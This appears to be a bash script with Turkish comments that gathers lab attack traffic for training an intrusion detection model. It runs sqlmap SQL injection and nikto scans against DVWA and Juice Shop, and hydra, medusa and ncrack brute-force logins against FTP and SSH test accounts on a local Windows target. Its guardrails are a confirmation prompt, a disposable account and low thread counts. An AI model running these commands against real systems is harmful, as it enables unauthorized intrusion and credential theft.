#!/usr/bin/env bash
# ============================================================================
#  05_pi_webattack_patator_scenarios.sh  --  Host-tarafi VERI TOPLAMA senaryolari
# ============================================================================
#  YETKI: SADECE kullaniciya ait, ayni yerel LAN'daki Windows hedef makineye
#  karsi, kontrollu/yetkilendirilmis VERI TOPLAMA testi icindir. Baska bir
#  hedefe YONELTMEYIN. Kimlik-dogrulama senaryolari yalnizca ATILABILIR/test
#  hesabini hedefler -- gercek/uretim hesabi DEGIL.
#
#  AMAC (kok gerekce): multiclass modelin WebAttack / FTP-Patator / SSH-Patator
#  siniflari CICIDS-2017'nin TEK arac/TEK oturum izini EZBERLEMIS (bkz. agent-
#  memory: all-class-single-session-diversity-audit). Retrain icin HER sinifta
#  EN AZ 2 farkli araç/kaynak + standart-DISI portlar gerekiyor. Bu script
#  host-tarafi ikinci-arac kaynagidir (ESP32 sketch'leri birinci kaynak):
#     WebAttack   : ESP32 + sqlmap + nikto
#     FTP-Patator : esp32_ftp_patator.ino + hydra-ftp   (+ port 2121 varyanti)
#     SSH-Patator : hydra(03'te) + medusa + ncrack       (+ port 2222 varyanti)
#
#  PORT-BUCKET CESITLILIGI (kritik -- r24-port-bucket notu): _port_bucket
#  80/8080->http, >=1024->ephemeral. Ayni saldiriyi HEM standart HEM ephemeral
#  portta topla ki model port'a asiri-baglanamasin:
#     Web: 80(DVWA,http) + 3000(JuiceShop,ephemeral)
#     FTP: 21(ftp bucket) + 2121(ephemeral)
#     SSH: 22(ssh bucket) + 2222(ephemeral)
#
#  Tum senaryolar HIZ-SINIRLI/kisa surelidir. Brute-force araclarinda dusuk
#  paralellik (-t 4) kullanilir (davranissal/LSTM dalini besler, sel DEGIL).
#  Hedef tarafi: 05_windows_webtarget_setup.ps1 (-EnableWebApp -EnableSsh2222
#  -EnableFtp2121) ile hazirlanmali.
# ============================================================================

set -u

# ============================================================================
#  DUZENLENEBILIR DEGISKENLER  (yalnizca burayi degistir)
# ============================================================================
TARGET_IP="192.168.1.102"          # <-- Windows hedef makinenin LAN IP'si

# --- web hedef portlari ---
WEB_HTTP_PORT="80"                 # DVWA ("http" bucket) -- 01'in 8080 static server'iyla CAKISMAZ
WEB_EPH_PORT="3000"                # OWASP Juice Shop ("ephemeral" bucket)

# --- patator hedef portlari ---
FTP_PORT="21"                      # birincil FTP ("ftp" bucket)
FTP_EPH_PORT="2121"                # ephemeral-bucket FTP varyanti
SSH_PORT="22"                      # birincil SSH ("ssh" bucket)
SSH_EPH_PORT="2222"                # ephemeral-bucket SSH varyanti

# --- kimlik dogrulama (ATILABILIR test hesabi) ---
TEST_USER="testuser"               # gercek hesap DEGIL
WORDLIST_PATH="./wordlist.txt"     # parola listesi (yoksa asagida kucuk ornek uretilir)
BRUTE_THREADS="4"                  # dusuk paralellik (davranissal dal; hizli icin 16'ya cikar)

# --- DVWA icin sqlmap oturum cerezi (tarayicidan al; bkz. 05_windows_...ps1) ---
# Ornek: "PHPSESSID=abc123; security=low"  -- BOS ise DVWA-sqlmap adimi atlanir.
DVWA_COOKIE=""

# --- sqlmap siddeti (kisa/bounded tutuldu) ---
SQLMAP_LEVEL="2"
SQLMAP_RISK="2"
# ============================================================================

banner() {
    echo ""
    echo "============================================================"
    echo " $1"
    echo "============================================================"
}

pause() {
    echo ""
    read -r -p ">>> Devam etmek icin Enter'a bas (atlamak icin Ctrl+C)... " _
}

confirm_target() {
    echo "HEDEF        : $TARGET_IP"
    echo "  Web        : $WEB_HTTP_PORT (DVWA/http) + $WEB_EPH_PORT (JuiceShop/ephemeral)"
    echo "  FTP        : $FTP_PORT + $FTP_EPH_PORT     SSH: $SSH_PORT + $SSH_EPH_PORT"
    echo "TEST_USER    : $TEST_USER   (ATILABILIR test hesabi)"
    echo "WORDLIST     : $WORDLIST_PATH"
    read -r -p ">>> Bu hedef DOGRU ve sana ait mi? Onaylamak icin 'evet' yaz: " ans
    if [ "$ans" != "evet" ]; then
        echo "Iptal edildi."
        exit 1
    fi
}

# ----- Arac kurulum kontrolu ------------------------------------------------
ensure_tools() {
    banner "ARAC KURULUM KONTROLU (sqlmap / nikto / hydra / medusa / ncrack)"
    local missing=()
    for t in sqlmap nikto hydra medusa ncrack; do
        if ! command -v "$t" >/dev/null 2>&1; then
            missing+=("$t")
        fi
    done
    if [ "${#missing[@]}" -eq 0 ]; then
        echo "[OK] Tum araclar kurulu."
    else
        echo "[!] Eksik arac(lar): ${missing[*]}"
        echo "    Kurmak icin (sudo gerekir):"
        echo "    sudo apt update && sudo apt install -y ${missing[*]}"
        read -r -p ">>> Simdi kurmayi denemek ister misin? (e/h): " k
        if [ "$k" = "e" ]; then
            sudo apt update && sudo apt install -y "${missing[@]}"
        else
            echo "    Kurulum atlandi -- eksik araci gerektiren senaryolar atlanir/basarisiz olur."
        fi
    fi

    # Wordlist yoksa kucuk TEST listesi uret (yalnizca lab).
    if [ ! -f "$WORDLIST_PATH" ]; then
        echo "[i] Wordlist ($WORDLIST_PATH) yok -- kucuk TEST listesi olusturuluyor."
        printf '123456\npassword\nadmin\nroot\ntoor\nletmein\nqwerty\ntest123\nP@ssw0rd\nesp32test\n' > "$WORDLIST_PATH"
        echo "    [OK] Ornek wordlist yazildi: $WORDLIST_PATH"
    fi
}

# tek arac var mi (senaryo icinde nazik atlama)
have() { command -v "$1" >/dev/null 2>&1; }

# ============================================================================
#  WEBATTACK -- sqlmap (SQLi: union/boolean/error/time)
# ============================================================================
scenario_sqlmap_juice() {
    banner "WEB-1: sqlmap SQLi -> Juice Shop ($WEB_EPH_PORT / ephemeral bucket)"
    echo "Ne toplanir: OTOMATIK aracin (sqlmap) SQLi trafigi, kimlik-dogrulamasiz"
    echo "Juice Shop REST arama uc-noktasinda. ESP32'nin elle-yazma imzasindan FARKLI."
    echo "Not: --batch (soru sormaz), level=$SQLMAP_LEVEL risk=$SQLMAP_RISK ile bounded."
    pause
    if ! have sqlmap; then echo "[atla] sqlmap kurulu degil."; return; fi
    sqlmap -u "http://$TARGET_IP:$WEB_EPH_PORT/rest/products/search?q=test" \
        --batch --level="$SQLMAP_LEVEL" --risk="$SQLMAP_RISK" --flush-session
}

scenario_sqlmap_dvwa() {
    banner "WEB-2: sqlmap SQLi -> DVWA ($WEB_HTTP_PORT / http bucket)"
    echo "Ne toplanir: sqlmap SQLi trafigi DVWA sqli sayfasinda (http bucket)."
    echo "DVWA oturum gerektirir -> DVWA_COOKIE degiskeni dolu olmali (bkz. dosya basi)."
    pause
    if ! have sqlmap; then echo "[atla] sqlmap kurulu degil."; return; fi
    if [ -z "$DVWA_COOKIE" ]; then
        echo "[atla] DVWA_COOKIE bos. Tarayicidan cerezi alip dosya basina yaz, tekrar calistir."
        return
    fi
    sqlmap -u "http://$TARGET_IP:$WEB_HTTP_PORT/vulnerabilities/sqli/?id=1&Submit=Submit" \
        --cookie="$DVWA_COOKIE" --batch --level="$SQLMAP_LEVEL" --risk="$SQLMAP_RISK" --flush-session
}

# ============================================================================
#  WEBATTACK -- nikto (web zafiyet taramasi: XSS/LFI/bilinen yollar)
# ============================================================================
scenario_nikto_http() {
    banner "WEB-3: nikto -> DVWA ($WEB_HTTP_PORT / http bucket)"
    echo "Ne toplanir: nikto'nun genis, kalibli WebAttack trafigi (sqlmap'ten farkli imza)."
    pause
    if ! have nikto; then echo "[atla] nikto kurulu degil."; return; fi
    nikto -host "http://$TARGET_IP:$WEB_HTTP_PORT/" -maxtime 120s
}

scenario_nikto_eph() {
    banner "WEB-4: nikto -> Juice Shop ($WEB_EPH_PORT / ephemeral bucket)"
    echo "Ne toplanir: ayni nikto imzasi AMA ephemeral bucket'ta (port-cesitliligi)."
    pause
    if ! have nikto; then echo "[atla] nikto kurulu degil."; return; fi
    nikto -host "http://$TARGET_IP:$WEB_EPH_PORT/" -maxtime 120s
}

# ============================================================================
#  FTP-PATATOR -- hydra (ESP32 disi IKINCI arac) + port 2121 varyanti
# ============================================================================
scenario_hydra_ftp() {
    banner "FTP-1: hydra FTP-Patator -> $FTP_PORT (ftp bucket) -t$BRUTE_THREADS"
    echo "Ne toplanir: host-tarafi (hydra) FTP brute-force -- ESP32 gomulu istemciden"
    echo "FARKLI ag imzasi (ikinci kaynak). Dusuk paralellik -> davranissal dal."
    echo "Hedef ATILABILIR '$TEST_USER' hesabi -- gercek hesap DEGIL."
    pause
    if ! have hydra; then echo "[atla] hydra kurulu degil."; return; fi
    hydra -l "$TEST_USER" -P "$WORDLIST_PATH" -t "$BRUTE_THREADS" -f -V \
        "ftp://$TARGET_IP:$FTP_PORT"
}

scenario_hydra_ftp_eph() {
    banner "FTP-2: hydra FTP-Patator -> $FTP_EPH_PORT (ephemeral bucket) -t$BRUTE_THREADS"
    echo "Ne toplanir: AYNI hydra-ftp AMA 2121 (ephemeral bucket) -- port kisayolunu kirar."
    pause
    if ! have hydra; then echo "[atla] hydra kurulu degil."; return; fi
    hydra -l "$TEST_USER" -P "$WORDLIST_PATH" -t "$BRUTE_THREADS" -f -V \
        "ftp://$TARGET_IP:$FTP_EPH_PORT"
}

# ============================================================================
#  SSH-PATATOR -- medusa + ncrack (03'teki hydra disi IKINCI/UCUNCU araclar)
# ============================================================================
scenario_medusa_ssh() {
    banner "SSH-1: medusa SSH-Patator -> $SSH_PORT (ssh bucket) -t$BRUTE_THREADS"
    echo "Ne toplanir: medusa (hydra'dan FARKLI arac/imza) SSH brute-force. Ikinci kaynak."
    pause
    if ! have medusa; then echo "[atla] medusa kurulu degil."; return; fi
    medusa -h "$TARGET_IP" -n "$SSH_PORT" -u "$TEST_USER" -P "$WORDLIST_PATH" \
        -M ssh -t "$BRUTE_THREADS" -f
}

scenario_medusa_ssh_eph() {
    banner "SSH-2: medusa SSH-Patator -> $SSH_EPH_PORT (ephemeral bucket) -t$BRUTE_THREADS"
    echo "Ne toplanir: AYNI medusa-ssh AMA 2222 (ephemeral bucket) -- port kisayolunu kirar."
    pause
    if ! have medusa; then echo "[atla] medusa kurulu degil."; return; fi
    medusa -h "$TARGET_IP" -n "$SSH_EPH_PORT" -u "$TEST_USER" -P "$WORDLIST_PATH" \
        -M ssh -t "$BRUTE_THREADS" -f
}

scenario_ncrack_ssh() {
    banner "SSH-3: ncrack SSH-Patator -> $SSH_PORT (UCUNCU arac, ekstra cesitlilik)"
    echo "Ne toplanir: ncrack (hydra/medusa'dan yine farkli imza). Ozellikle zamanlama"
    echo "profili farkli -> davranissal ozellik cesitliligi. CR=zaman-sinirli."
    pause
    if ! have ncrack; then echo "[atla] ncrack kurulu degil."; return; fi
    # ncrack hiz sablonu -T3 (orta); asla en agresif -T5 kullanma.
    ncrack -p "$SSH_PORT" --user "$TEST_USER" -P "$WORDLIST_PATH" -T 3 "$TARGET_IP"
}

# ============================================================================
#  ANA AKIS
# ============================================================================
main() {
    banner "HOST-TARAFI WEBATTACK / PATATOR VERI TOPLAMA SENARYOLARI"
    confirm_target
    ensure_tools

    echo ""
    echo "Senaryolar TEK TEK, aralarinda Enter beklenerek calisacak. Her senaryodan"
    echo "sonra ~15sn bekleyip Windows'ta 04_mongo_analysis.py ile pencereyi incele"
    echo "(--attacker-ip = bu Pi/host makinesinin LAN IP'si)."
    pause

    # WebAttack (2 arac x 2 bucket)
    scenario_sqlmap_juice
    pause
    scenario_sqlmap_dvwa
    pause
    scenario_nikto_http
    pause
    scenario_nikto_eph
    pause
    # FTP-Patator (ikinci arac + ephemeral bucket)
    scenario_hydra_ftp
    pause
    scenario_hydra_ftp_eph
    pause
    # SSH-Patator (ikinci/ucuncu arac + ephemeral bucket)
    scenario_medusa_ssh
    pause
    scenario_medusa_ssh_eph
    pause
    scenario_ncrack_ssh

    banner "TUM SENARYOLAR TAMAMLANDI"
    echo "Windows'ta: python 04_mongo_analysis.py --start <baslangic> --end <bitis> \\"
    echo "                     --attacker-ip <bu makinenin IP'si>"
    echo "Hedef temizligi: 06_windows_webtarget_cleanup.ps1  (+ 02_windows_cleanup.ps1)"
}

main "$@"
